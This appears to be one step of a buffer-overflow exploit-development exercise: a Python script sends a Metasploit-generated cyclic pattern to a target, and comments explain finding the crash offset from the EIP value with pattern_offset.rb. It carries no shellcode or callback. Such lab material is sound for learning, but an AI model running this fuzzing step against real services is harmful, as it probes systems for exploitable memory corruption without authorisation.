from constants import *

### Execute pattern_create.rb to generate the pattern
## /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l Num-bytes > pattern

with open('pattern') as f:
    payload = f.read().strip()

print("Sending Patern...")

send_payload(payload + "\n")


## Once we've sended the pattern, we take the EIP value showed in inmunity debuger and use it to exactly now where the app crashes.

## /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l Num-bytes -q EIP

